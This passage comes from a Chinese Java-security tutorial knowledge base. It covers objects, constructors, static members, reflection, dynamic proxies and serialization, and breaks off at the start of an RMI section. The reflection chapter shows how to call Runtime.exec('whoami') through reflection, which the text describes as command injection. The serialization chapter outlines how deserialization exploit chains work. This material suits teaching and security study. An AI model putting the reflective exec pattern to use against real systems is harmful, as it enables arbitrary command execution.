方法区是存放加载的类信息，方法信息的地址，程序要运行，首先要将Main.class（包含方法等）放置在方法区，然后再将Person.class字节码存入到方法区内 栈里存放了方法运行（main方法）时的局部变量，aaron，joe都是对象变量 堆：当使用new 关键字，就表示在堆中开辟一块新的存储空间 对象的引用地址就是在new的时候在堆里创建的一个地址，这种关系被称为引用关系，当我们操作aaron对象的时候，实际上是操作的0x1234这个地址的数据 对象的打印、比较、生命周期 打印 打印对象的时候，打印出来的效果如下：类的名称@十六进制的hashcode 如果想知道对象里的成员变量信息，就需要Object.toString()方法 // Main package com.study.Object; public class Main { public static void main(String[] args) { Person aaron = new Person(); Person joe = new Person(); System.out.println(aaron); System.out.println(joe); } } com.study.Object.Person@1540e19d com.study.Object.Person@677327b6 比较 == : 对于基本数据类型来说，比较的是值，对于引用类型来说，比较的是在内存中地址的值，每次使用new关键字，都表示在堆值新开辟一块内存空间，不同的内存空间地址值不同 如果对象拥有完全相同的数据，是否能俩对象相等？可以使用Object.equals()方法 package com.study.Object; public class Main { public static void main(String[] args) { Person aaron = new Person(); Person joe = new Person(); System.out.println(aaron == joe); } } false 生命周期 对象什么时候出生：每次使用new 关键字的时候，就会在堆内存中开辟新的空间，此时对象开始存在 对象什么时候结束：当堆中的对象没有被任何变量所引用，此时该对象就成了垃圾，就等着垃圾回收器（GC）来回收该垃圾，当被回收后，对象就被销毁了 回收垃圾的目的是为了释放更多的内存 匿名对象：匿名/佚名 没有名称的对象，也就是在堆中开辟一块新的内存空间，但是没有把该空间地址赋给任何变量，如下所示 new Person(); 因为没有名称，匿名对象仅仅只能使用一次，用完一次之后，就等着GC来回收，一般的把匿名对象作为方法的实参传递 构造器 // 这个代码调用一个方法名为Person() 的无参数方法 // 这个方法就是构造方法(Constructor) Person person = new Person(); 我们在Person类中，没有找到该构造方法，却又没有报错，但是在反编译之后，是存在该构造方法 package com.study.Object; public class Person { public String userName; public int age; public int weight; public void sign() { System.out.println(this.userName + \" is sign~\"); } public void dance() { System.out.println(this.userName + \" is dance~\"); } } 当我们在编译的时候，编译器会创建该默认(缺省)构造函数 构造器的作用 创建对象，但是必须要和new一起使用 完成对象的初始化操作 构造器的特点 构造器的名称和当前所在类的名称相同 禁止定义返回类型，千万不要使用void作为返回类型，void Person(){}这就是个普通方法 在构造器中不需要使用return，返回的是当前创建对象的引用 编译器创建的默认构造器特点 符合构造函数特点 无参数 无方法体 如果类没有使用public修饰，则编译器创建的构造器也没有public修饰自定义构造器与构造器重载 如果没有显示提供构造器，则编译器在编译过程中会创建一个缺省构造器，但是如果显式定义了一个构造器，编译器在编译过程中则不会再创建缺省构造器自定义构造器 ```java // Person.java package com.study.Object; public class Person { public String userName; public int age; public int weight; public Person(){ System.out.println(\"我被调用了\"); } } ```java // Main.java package com.study.Object; public class Main { public static void main(String[] args) { Person person = new Person(); } } 我被调用了 说明创建对象其实是在调用构造器 构造器重载 方法的重载（Overload）避免在同一个类中，相同功能的方法名字不同 判断：两同一不同：同一个类，同一个方法名称，参数不同 构造器的的重载 构造器是一种特殊的方法，也可以存在重载 // Person.java package com.study.Object; public class Person { public String userName; public int age; public int weight; public Person(){ System.out.println(\"我被调用了\"); } public Person(String userName){ System.out.println(\"我被调用了username\"); } } // Main.java package com.study.Object; public class Main { public static void main(String[] args) { Person person = new Person(); Person Person1 = new Person(\"aaron\"); } } 我被调用了 我被调用了username static 修饰符 状态和行为应该有对象和类型之分 有的状态和行为应该属于对象，不同的对象状态和行为可以不一样 有的状态和行为应该属于类型，不属于对象 static 的真正作用，用来区别字段，方法，内部类，初始化代码块 static 修饰符的特点： static 修饰符修饰的成员(字段/方法)，随着所在类的加载而加载，当JVM把字节码加载进JVM的时候，static修饰的成员已经在内存中存在了 优先于对象的存在，对象是手动通过new关键字创建出来的 static 修饰符修饰的成员被该类型的所有对象共享，根据该类创建出来的任何对象，都可以访问static成员，表面上通过对象去访问static 修饰的成员，其本质依然使用类型访问，和对象没有任何关系 直接使用类名访问static成员，因为static修饰的成员直接属于类，不属于对象，可以直接使用类名访问static成员 ```java // Person.java package com.study.Object; public class Person { String name = \"\"; int age = 0; static int totalNum = 5; public Person(String name, int age) { name = name; age = age; totalNum++; } void die() { totalNum--; System.out.println(\"die\"); } static void destory() { totalNum = 0; System.out.println(\"destory\"); } } ```java package com.study.Object; public class Main { public static void main(String[] args) { System.out.println(Person.totalNum); Person person = new Person(\"aaron\",24); System.out.println(Person.totalNum); } } 5 6 static 成员在JVM中的存储 字节码加载进虚拟机，static成员就已经在方法区了 类成员与实例成员 类中的成员：字段、方法，内部类 类成员：使用static修饰的成员 实例成员：没有static 修饰的成员 类成员只能访问类成员，实例成员只能访问实例成员 类成员直接属于类，可以通过类访问static字段和static 方法 实例成员，只属于对象，通过对象来访问非static字段和非static 方法 在static 方法，只能调用static 成员 非static 方法，可以访问静态成员，也可以访问实例成员 什么时候定义成static 的字段和方法 如果这一个状态/行为属于整个事物（类）就直接使用static修饰i，被所有对象使用，一般在开发中，往往把工具方法使用static 修饰，如果不适用static修饰，则这些方法属于该类的对象，就得需要创建对象再调用方法，开发工具对象只需要一份即可，可能创建N个对象，此时往往把类设计为单例 弊端：生命周期长 未完待续。。。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 15:50:56 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/02.Java_面向对象/ Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/03.Java反射机制/":{"url":"知识库/02.JAVA安全/03.Java反射机制/","title":"03.Java反射机制","keywords":"","body":" 反射 何为反射 获取class的Class实例 方法一 方法二 方法三 方法四 比较 获取基本信息 小结 访问字段 获取字段的一些信息 获取字段的值 获取所有的字段 修改字段的值 小结 调用方法（‼️） 获取方法 调用方法 示例 小结 调用构造方法 举例 示例 小结 获取继承关系 获取父类class和interface 小结 动态代理 过程 小结 反射 何为反射 反射就是Reflection，Java的反射是指程序在运行期可以拿到一个对象的所有信息。即Java反射机制是在运行状态时，对于任意一个类，都能够获取到这个类的所有属性和方法，对于任意一个对象，都能够调用它的任意一个方法和属性(包括私有的方法和属性)，这种动态获取的信息以及动态调用对象的方法的功能就称为java语言的反射机制。 class（包括interface）的本质是数据类型（Type） 而**class**是由JVM在执行过程中动态加载的。JVM在第一次读取到一种**class**类型时，将其加载进内存。 每加载一种class，JVM就为其创建一个Class类型的实例，并关联起来。注意：这里的Class类型是一个名叫Class的class。它长这样： public final class Class { private Class() {} } 以String类为例，当JVM加载String类时，它首先读取String.class文件到内存，然后，为String类创建一个Class实例并关联起来： Class cls = new Class(String); 这个Class实例是JVM内部创建的，如果我们查看JDK源码，可以发现Class类的构造方法是private，只有JVM能创建Class实例，我们自己的Java程序是无法创建Class实例的。 所以，JVM持有的每个Class实例都指向一个数据类型（class或interface） 由于JVM为每个加载的**class**创建了对应的**Class**实例，并在实例中保存了该**class**的所有信息，包括类名、包名、父类、实现的接口、所有方法、字段等，因此，如果获取了某个**Class**实例，我们就可以通过这个**Class**实例获取到该实例对应的**class**的所有信息。 这种通过**Class**实例获取**class**信息的方法称为反射（Reflection）。 获取class的Class实例 获取一个class的Class实例，有4个方法： 方法一 直接通过一个class的静态变量class获取： Class cls = String.class; 方法二 如果我们有一个实例变量，可以通过该实例变量提供的getClass()方法获取： String s = \"Hello\"; Class cls = s.getClass(); 方法三 如果知道一个class的完整类名，可以通过静态方法Class.forName()获取： Class cls = Class.forName(\"java.lang.String\"); 方法四 利用classLoader Class cls = ClassLoader.getSystemClassLoader().loadClass(\"java.lang.Runtime\") 比较 因为Class实例在JVM中是唯一的，所以，上述方法获取的Class实例是同一个实例。可以用==比较两个Class实例： Class cls1 = String.class; String s = \"Hello\"; Class cls2 = s.getClass(); boolean sameClass = cls1 == cls2; // true 获取基本信息 获取class的基本信息 package org.example; import java.util.ArrayList; public class App{ public static void main(String[] args) { Class cls1 = String.class; ArrayList a = new ArrayList(); Class cls2 = a.getClass(); printInfo(cls1); printInfo(cls2); } static void printInfo(Class cls){ System.out.println(\"Class name : \" + cls.getName()); System.out.println(\"Simple name: \" + cls.getSimpleName()); if (cls.getPackage() != null) { System.out.println(\"Package name: \" + cls.getPackage().getName()); } System.out.println(\"is interface: \" + cls.isInterface()); System.out.println(\"is enum: \" + cls.isEnum()); System.out.println(\"is array: \" + cls.isArray()); System.out.println(\"is primitive: \" + cls.isPrimitive()); } } 小结 JVM为每个加载的class及interface创建了对应的Class实例来保存class及interface的所有信息； 获取一个class对应的Class实例后，就可以获取该class的所有信息； 通过Class实例获取class信息的方法称为反射（Reflection）； JVM总是动态加载class，可以在运行期根据条件来控制加载class。 访问字段 对任意的一个Object实例，只要我们获取了它的Class，就可以获取它的一切信息。 我们先看看如何通过Class实例获取字段信息。 获取字段的一些信息 import java.util.Arrays; public class Test{ public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException { Class ot = OtherTest.class; System.out.println(Arrays.toString(ot.getFields())); // 获取所有public的field（包括父类） System.out.println(Arrays.toString(ot.getDeclaredFields())); // 获取当前类的所有field（不包括父类） System.out.println(ot.getField(\"a\")); // 根据字段名获取某个 public 的field（包括父类） System.out.println(ot.getDeclaredField(\"b\")); // 根据字段名获取当前类的某个field（不包括父类） System.out.println(ot.getField(\"a\").getName()); // 字段名称 System.out.println(ot.getField(\"a\").getType()); // 字段类型，也是一个Class实例 System.out.println(ot.getField(\"a\").getModifiers()); // 修饰符 } } class OtherTest extends emmTest{ public int a = 5; private int b; } class emmTest { public float cc; } [public int OtherTest.a, public float emmTest.cc] [public int OtherTest.a, private int OtherTest.b] public int OtherTest.a private int OtherTest.b a int 1 获取字段的值 先获取Class实例，再获取Field实例，然后，用Field.get(Object)获取指定实例的指定字段的值。 package org.example; import java.lang.reflect.Field; public class App { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException { OtherTest ot = new OtherTest(\"haha\"); Class cls = ot.getClass(); Field f = cls.getDeclaredField(\"name\"); f.setAccessible(true); // 设置访问权限，一律为true，不然不能访问 private 的 Object value = f.get(ot); // 从对象ot中获取值，因为所有的同类型class共用一个Class，所以获取内容要选定对象 System.out.println(value); } } class OtherTest { private String name; public OtherTest(String name) { this.name = name; } } // 输出 haha 反射是一种非常规的用法，使用反射，首先代码非常繁琐，其次，它更多地是给工具或者底层框架来使用，目的是在不知道目标实例任何信息的情况下，获取特定字段的值。 此外，setAccessible(true)可能会失败。如果JVM运行期存在SecurityManager，那么它会根据规则进行检查，有可能阻止setAccessible(true)。例如，某个SecurityManager可能不允许对java和javax开头的package的类调用setAccessible(true)，这样可以保证JVM核心库的安全。 获取所有的字段 public class APP { public static void main(String[] args) throws IllegalAccessException { OtherTest ot = new OtherTest(\"haha\"); Class cls = ot.getClass(); Field[] f = cls.getDeclaredFields(); //取所有的字段 for (Field field : f) { field.setAccessible(true);// 设置访问权限，一律为true，不然不能访问 private 的 System.out.println(field.getName() + \" \" + field.getType()); // 获取field 的Name，Type System.out.println(field.get(ot)); } } } class OtherTest { private String name; public OtherTest(String name) { this.name = name; } } // 输出 // name class java.lang.String // haha 修改字段的值 package org.example; import java.lang.reflect.Field; public class App { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException { OtherTest ot = new OtherTest(\"haha\"); Class cls = ot.getClass(); Field f = cls.getDeclaredField(\"name\"); f.setAccessible(true); // 设置访问权限，一律为true，不然不能访问 private 的 f.set(ot, \"modify\"); // 反射修改值 System.out.println(ot.getName()); } } class OtherTest { private String name; public OtherTest(String name) { this.name = name; } public String getName() { return name; } } 小结 Java的反射API提供的Field类封装了字段的所有信息： 通过Class实例的方法可以获取Field实例：getField()，getFields()，getDeclaredField()，getDeclaredFields()； 通过Field实例可以获取字段信息：getName()，getType()，getModifiers()； 通过Field实例可以读取或设置某个对象的字段，如果存在访问限制，要首先调用setAccessible(true)来访问非public字段。 通过反射读写字段是一种非常规方法，它会破坏对象的封装。 调用方法（‼️） 获取方法 通过Class实例获取所有Method信息。Class类提供了以下几个方法来获取Method import java.util.Arrays; public class Test{ public static void main(String[] args) throws NoSuchMethodException { Class cls = OtherTest.class; // Class cls = ot.getClass(); System.out.println(Arrays.toString(cls.getMethods())); // 获取所有public的Method（包括父类） System.out.println(Arrays.toString(cls.getDeclaredMethods())); // 获取当前类的所有Method（不包括父类） System.out.println(cls.getMethod(\"echoEver\", String.class)); // 获取某个public的Method（包括父类） //.getMethod(方法名，这个方法的参数类型) System.out.println(cls.getDeclaredMethod(\"echoEver\", String.class)); // 获取当前类的某个Method（不包括父类） } } class OtherTest{ public void echoEver(String thing){ System.out.println(thing); } } // ===== /* [public void org.example.OtherTest.echoEver(java.lang.String), public final void java.lang.Object.wait(long,int) throws java.lang.InterruptedException, public final native void java.lang.Object.wait(long) throws java.lang.InterruptedException, public final void java.lang.Object.wait() throws java.lang.InterruptedException, public boolean java.lang.Object.equals(java.lang.Object), public java.lang.String java.lang.Object.toString(), public native int java.lang.Object.hashCode(), public final native java.lang.Class java.lang.Object.getClass(), public final native void java.lang.Object.notify(), public final native void java.lang.Object.notifyAll()] [public void org.example.OtherTest.echoEver(java.lang.String)] public void org.example.OtherTest.echoEver(java.lang.String) public void org.example.OtherTest.echoEver(java.lang.String) */ 调用方法 获取Class实例 反射获取方法 invoke调用方法 package org.example; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class App { public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException { OtherTest ot = new OtherTest(); Class cls = ot.getClass(); Method echoEver = cls.getDeclaredMethod(\"echoEver\", String.class); echoEver.setAccessible(true); echoEver.invoke(ot,\"test\"); // 第一个参数是调用该方法的对象，第二个参数是一个可变长参数，是这个方法的需要传入的参数 } } class OtherTest{ private void echoEver(String thing){ System.out.println(thing); } } 示例 这里再以Java中使用反射调取Runtime来执行命令注入 // 传统使用Java 来执行Runtime进行命令执行代码 package org.example; import java.io.*; public class App { public static void main(String[] args) throws IOException{ Process s = Runtime.getRuntime().exec(\"whoami\"); InputStream inputStream = s.getInputStream(); InputStreamReader inputStreamReader = new InputStreamReader(inputStream); BufferedReader bufferedReader = new BufferedReader(inputStreamReader); String line; while ((line = bufferedReader.readLine()) != null) { System.out.println(line); } } } 使用反射 package com.ReflectTest; import java.io.*; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class Reflect { public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException { Class clazz = Class.forName(\"java.lang.Runtime\"); Method method = clazz.getDeclaredMethod(\"exec\", String.class); Process process = (Process) method.invoke(Class.forName(\"java.lang.Runtime\").getDeclaredMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")), \"whoami\"); // 这里细看Class.forName(\"java.lang.Runtime\").getDeclaredMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")) // 在这里，method.invoke 第一个参数是实例化的对象，从不使用反射的代码中看，应该是Runtime.getRuntime() 这个实例化对象 // 然后要调用 getRuntime()的实例化对象则是Runtime，所以整合起来如下： // Class.forName(\"java.lang.Runtime\").getDeclaredMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")) // 这个就是上述调用exec方法的实例化对象RunTime.getRuntime() // 反射调用方法，就是从后往前依次寻找调用方法的实例化对象，加上参数 InputStream inputStream = process.getInputStream(); InputStreamReader inputStreamReader = new InputStreamReader(inputStream); BufferedReader bufferedReader = new BufferedReader(inputStreamReader); String line; while ((line = bufferedReader.readLine()) != null) { System.out.println(line); } } } class OtherTest { private void echoEver(String thing) { System.out.println(thing); } } 小结 Java的反射API提供的Method对象封装了方法的所有信息： 通过Class实例的方法可以获取Method实例：getMethod()，getMethods()，getDeclaredMethod()，getDeclaredMethods()； 通过Method实例可以获取方法信息：getName()，getReturnType()，getParameterTypes()，getModifiers()； 通过Method实例可以调用某个对象的方法：Object invoke(Object instance, Object... parameters)； 通过设置setAccessible(true)来访问非public方法； 通过反射调用方法时，仍然遵循多态原则。 调用构造方法 举例 我们通常使用new操作符创建新的实例： Person p = new Person(); 如果通过反射来创建新的实例，可以调用Class提供的newInstance()方法： Person p = Person.class.newInstance(); 调用**Class.newInstance()**的局限是，它只能调用该类的public无参数构造方法。如果构造方法带有参数，或者不是public，就无法直接通过**Class.newInstance()**来调用。 为了调用任意的构造方法，Java的反射API提供了Constructor对象，它包含一个构造方法的所有信息，可以创建一个实例。Constructor对象和Method非常类似，不同之处仅在于它是一个构造方法，并且，调用结果总是返回实例： package org.example; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; import java.util.Arrays; public class App { public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException { Class cls = Integer.class; System.out.println(cls.getName()); System.out.println(Arrays.toString(cls.getConstructors())); // Integer.class.getConstructor(int.class); Constructor cons1 = cls.getConstructor(int.class); Integer int1 = cons1.newInstance(123); System.out.println(int1); Constructor cons2 = cls.getConstructor(String.class); System.out.println(cons2.newInstance(\"456\")); } } /* java.lang.Integer [public java.lang.Integer(int), public java.lang.Integer(java.lang.String) throws java.lang.NumberFormatException] 123 456 */ 通过Class实例获取Constructor的方法如下： getConstructor(Class...)：获取某个public的Constructor； getDeclaredConstructor(Class...)：获取某个Constructor； getConstructors()：获取所有public的Constructor； getDeclaredConstructors()：获取所有Constructor。 注意Constructor总是当前类定义的构造方法，和父类无关，因此不存在多态的问题。 调用非public的Constructor时，必须首先通过setAccessible(true)设置允许访问。setAccessible(true)可能会失败。 示例 调用方法示例使用invoke方法反射调用Runtime.getRuntime.exec(String.class)方法，那么由Construct改写如下： package com.ReflectTest; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class App { public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException { Class clazz = Class.forName(\"java.lang.Runtime\"); Method method = clazz.getDeclaredMethod(\"exec\", String.class); Constructor constructor = clazz.getDeclaredConstructor(); constructor.setAccessible(true); // 实例化 Runtime runtime = (Runtime) constructor.newInstance(); // 使用exec调用 Process process = (Process) method.invoke(runtime.getRuntime(), \"whoami\"); InputStream inputStream = process.getInputStream(); InputStreamReader inputStreamReader = new InputStreamReader(inputStream); BufferedReader bufferedReader = new BufferedReader(inputStreamReader); String line; while ((line = bufferedReader.readLine()) != null) { System.out.println(line); } } } 小结 Constructor对象封装了构造方法的所有信息； 通过Class实例的方法可以获取Constructor实例：getConstructor()，getConstructors()，getDeclaredConstructor()，getDeclaredConstructors()； 通过Constructor实例可以创建一个实例对象：newInstance(Object... parameters)； 通过设置setAccessible(true)来访问非public构造方法。 获取继承关系 获取父类class和interface import java.util.Arrays; public class Test{ public static void main(String[] args) { OtherTest ot = new OtherTest(\"emm\"); Class cls = ot.getClass(); System.out.println(cls.getSuperclass()); // 获取父类class System.out.println(Arrays.toString(cls.getInterfaces())); // 获取接口 System.out.println(\"\".getClass().getSuperclass()); // 获取 String 的父类 } } class OtherTest extends Emmm implements Aaa{ private String name; public OtherTest(String name){ this.name = name; } @Override public void echo() { System.out.println(\"666\"); } } class Emmm { private int aa; } interface Aaa{ public void echo(); } /* class org.example.Emmm [interface org.example.Aaa] class java.lang.Object */ 小结 通过Class对象可以获取继承关系： Class getSuperclass()：获取父类类型； Class[] getInterfaces()：获取当前类实现的所有接口。 通过Class对象的isAssignableFrom()方法可以判断一个向上转型是否可以实现。 动态代理 有没有可能不编写实现类，直接在运行期创建某个**interface**的实例呢？ 这是可能的，因为Java标准库提供了一种动态代理（Dynamic Proxy）的机制：可以在运行期动态创建某个interface的实例。 所谓动态代理，是和静态相对应的。我们来看静态代码怎么写： // 创建接口 public interface Hello { void morning(String name); } // 实现接口Hello public class HelloWorld implements Hello { public void morning(String name) { System.out.println(\"Good morning, \" + name); } } // 创建实例，调用 public static void main(String[] args) { Hello hello = new HelloWorld(); hello.morning(\"Bob\"); } 动态如下 过程 ，不需要单独实现接口，而是动态实现接口。 过程 在运行期动态创建一个interface实例的方法如下： 定义一个InvocationHandler实例，它负责实现接口的方法调用； 通过Proxy.newProxyInstance()创建interface实例，它需要3个参数： 使用的ClassLoader，通常就是接口类的ClassLoader； 需要实现的接口数组，至少需要传入一个接口进去； 用来处理接口方法调用的InvocationHandler实例。 将返回的Object强制转型为接口。 package org.example; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; public class App{ public static void main(String[] args) { InvocationHandler handler = new InvocationHandler() { @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(method); System.out.println(args.length); // 实现对应的方法 if (method.getName().equals(\"echo\")){ System.out.println(args[0]); } return null; } }; Hello hello = (Hello) Proxy.newProxyInstance(Hello.class.getClassLoader(), new Class[]{Hello.class}, handler); hello.echo(\"9999\"); } } interface Hello{ public void echo(String s); } /* 1 9999 */ 小结 Java标准库提供了动态代理功能，允许在运行期动态创建一个接口的实例； 动态代理是通过Proxy创建代理对象，然后将接口方法“代理”给InvocationHandler完成的。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 15:49:59 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/03.Java反射机制/ Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/04.Java序列化与反序列化/":{"url":"知识库/02.JAVA安全/04.Java序列化与反序列化/","title":"04.Java序列化与反序列化","keywords":"","body":" Java 序列化和反序列化 介绍 什么是序列化和反序列化 序列化要求 其他 序列化步骤 反序列化步骤 代码举例 序列化和反序列化 --> 文件 序列化和反序列化 --> bytes数组 序列化特征 安全性 反序列化漏洞的攻击流程 漏洞挖掘 Java 序列化和反序列化 介绍 序列化和反序列化都是在对象的基础上进行的！！！ 必须要 **implements Serializable** 的类才可以序列化和反序列化 什么是序列化和反序列化 java的序列化机制就是为了持久化存储某个对象或者在网络上传输某个对象。我们都知道，一旦jvm关闭，那么java中的对象也就销毁了，所以要想保存它，就需要把他转换为字节序列写到某个文件或是其它哪里。 Java 提供了一种对象序列化的机制，该机制中，一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。即序列化是指把一个Java对象变成二进制内容，本质上就是一个byte[]数组。 为什么要把Java对象序列化呢？因为序列化后可以把byte[]保存到文件中，或者把byte[]通过网络传输到远程，这样，就相当于把Java对象存储到文件或者通过网络传输出去了。 将序列化对象写入文件之后，可以从文件中读取出来，并且对它进行反序列化，即把一个二进制内容（也就是byte[]数组）变回Java对象。有了反序列化，保存到文件中的byte[]数组又可以“变回”Java对象，或者从网络上读取byte[]并把它“变回”Java对象。也就是说，对象的类型信息、对象的数据，还有对象中的数据类型可以用来在内存中新建对象。 整个过程都是 Java 虚拟机（JVM）独立的，也就是说，在一个平台上序列化的对象可以在另一个完全不同的平台上反序列化该对象。 Java的序列化机制仅适用于Java，如果需要与其它语言交换数据，必须使用通用的序列化方法，例如JSON。 序列化要求 一个Java对象要能序列化，必须实现一个特殊的java.io.Serializable接口，它的定义如下： public interface Serializable { } Serializable接口没有定义任何方法，它是一个空接口。我们把这样的空接口称为“标记接口”（Marker Interface），实现了标记接口的类仅仅是给自身贴了个“标记”，并没有增加任何方法。 其他 类 ObjectInputStream 和 ObjectOutputStream 是高层次的数据流，它们包含反序列化和序列化对象的方法。 ObjectOutputStream 类包含很多写方法来写各种数据类型，但是一个特别的方法例外： public final void writeObject(Object x) throws IOException 上面的方法序列化一个对象，并将它发送到输出流。相似的 ObjectInputStream 类包含如下反序列化一个对象的方法： public final Object readObject() throws IOException, ClassNotFoundException 该方法从流中取出下一个对象，并将对象反序列化。它的返回值为Object，因此，你需要将它转换成合适的数据类型。 序列化步骤 把对象转换为字节序列 步骤一：创建一个ObjectOutputStream输出流； 步骤二：调用ObjectOutputStream对象的writeObject输出可序列化对象。 反序列化步骤 把字节序列转换为对象 步骤一：创建一个ObjectInputStream输入流； 步骤二：调用ObjectInputStream对象的readObject()得到序列化的对象。 代码举例 序列化和反序列化 --> 文件 package org.example; import java.io.*; public class App{ public static void main(String[] args) throws IOException, ClassNotFoundException { SerializeDemo serializeDemo = new SerializeDemo(); serializeDemo.x = 666; // 序列化 // 创建一个FileOutputStream，且将这个FileOutputStream封装到ObjectOutputStream中 ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(\"123.ser\")); // 调用writeObject方法，序列化对象到文件123.ser中 objectOutputStream.writeObject(serializeDemo); objectOutputStream.close(); // 反序列化 // 创建一个FIleInutputStream，并将FileInputStream封装到ObjectInputStream中 try (ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(\"123.ser\"))) { // 调用readObject从123.ser中反序列化出对象，还需要进行一下类型转换，默认是Object类型 SerializeDemo ss = (SerializeDemo) objectInputStream.readObject(); System.out.println(ss.add(1,2)); } } } class SerializeDemo implements Serializable { // 必须要实现Serializable这个接口，可以不用里面的方法 public int x; public int add(int a,int b){ return a+b+x; } } 这里要注意以下要点： readObject() 方法中的 try/catch代码块尝试捕获 ClassNotFoundException 异常。对于 JVM 可以反序列化对象，它必须是能够找到字节码的类。如果JVM在反序列化对象的过程中找不到该类，则抛出一个 ClassNotFoundException 异常。 readObject() 方法的返回值被转化成 SerializeDemo引用。 序列化和反序列化 --> bytes数组 package org.example; import java.io.*; import java.util.Arrays; public class App{ public static void main(String[] args) throws IOException, ClassNotFoundException { SerializeDemo serializeDemo = new SerializeDemo(); serializeDemo.x = 666; // 序列化 ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); // 本体 ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); // 只是一个装饰器的作用 Filter模式，懂？ objectOutputStream.writeObject(serializeDemo); objectOutputStream.close(); System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray())); // 反序列化 ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray()); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); SerializeDemo serializeDemo1 = (SerializeDemo)objectInputStream.readObject(); objectInputStream.close(); serializeDemo1.add(1,2); } } class SerializeDemo implements Serializable { // 必须要实现Serializable这个接口，可以不用里面的方法 public int x; public int add(int a,int b){ return a+b+x; } } /* [-84, -19, 0, 5, 115, 114, 0, 25, 111, 114, 103, 46, 101, 120, 97, 109, 112, 108, 101, 46, 83, 101, 114, 105, 97, 108, 105, 122, 101, 68, 101, 109, 111, -89, 103, -99, 60, 6, -29, 97, -91, 2, 0, 1, 73, 0, 1, 120, 120, 112, 0, 0, 2, -102] 669 */ 序列化特征 十六进制查看我们生成的123.ser # hexdump没有xxd直观 xxd 123.ser xxd显示的结果，中间那一栏是文件的十六进制显示，最右边是字符显示。这里需要注意的特征值就是16进制显示时的前32位： AC ED：STREAM_MAGIC，声明使用了序列化协议，从这里可以判断保存的内容是否为序列化数据。 （这是在黑盒挖掘反序列化漏洞很重要的一个点） 00 05：STREAM_VERSION，序列化协议版本。 安全性 因为Java的序列化机制可以导致一个实例能直接从byte[]数组创建，而不经过构造方法，因此，它存在一定的安全隐患。一个精心构造的byte[]数组被反序列化后可以执行特定的Java代码，从而导致严重的安全漏洞。 实际上，Java本身提供的基于对象的序列化和反序列化机制既存在安全性问题，也存在兼容性问题。更好的序列化方法是通过JSON这样的通用数据结构来实现，只输出基本类型（包括String）的内容，而不存储任何与代码相关的信息。 反序列化漏洞的攻击流程 客户端构造payload(有效载荷)，并进行一层层的封装，完成最后的exp（exploit-利用代码） exp发送到服务端，进入一个服务端自主重写（也可能是也有组件重写）的readobject函数，它会反序列化恢复我们构造的exp去形成一个恶意的数据格式exp_1（剥去第一层） 这个恶意数据exp_1在接下来的处理流程(可能是在自主重写的readobject中、也可能是在外面的逻辑中)，会执行一个exp_1这个恶意数据类的一个方法，在方法中会根据exp_1的内容进行函处理，从而一层层地剥去（或者说变形、解析）我们exp_1变成exp_2、exp_3...... 最后在一个可执行任意命令的函数中执行最后的payload，完成远程代码执行。 那么以上大概可以分成三个主要部分： payload：需要让服务端执行的语句：比如说弹计算器还是执行远程访问等； 反序列化利用链：服务端中存在的反序列化利用链，会一层层拨开我们的exp，最后执行payload。(如commons-collections利用链) 重写readObject：服务端中存在的可以与我们漏洞链相接的并且可以从外部访问的readObject函数重写点 漏洞挖掘 java是支持自定义readObject与writeObject方法的，只要某个类中按照特定的要求实现了readObject方法，那么在反序列化的时候就会自动调用它，如果这个自定义的readObject方法里进行了一些危险操作，那么就会导致反序列化漏洞的发生了。 举例如下： 可以看到自定义的readObject的确执行了，不过真实的应用中危险操作比较隐蔽。 需要注意的是，实现 readObject/writeObject 方法一定需要private 私有化，否则会找不到自定义的方法，从而使用ObjectOutputStream中的readObject方法 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 15:12:15 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/04.Java序列化与反序列化/ Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/05.RMI基础/":{"url":"知识库/02.JAVA安全/05.RMI基础/","title":"05.RMI基础","keywords":"","body":" RMI概述 RMI实现机制 RMI实现举例 实现过程 实现举例 HelloInterface.java HelloImpl.java Server.java Client.java 注意事项 参考文章 RMI概述 RMI: 远程方法调用(Remote Method Invocation)，它支持存储于不同地址空间的程序级对象之间彼此进行通信，实现远程对象之间的无缝远程调用。 Java 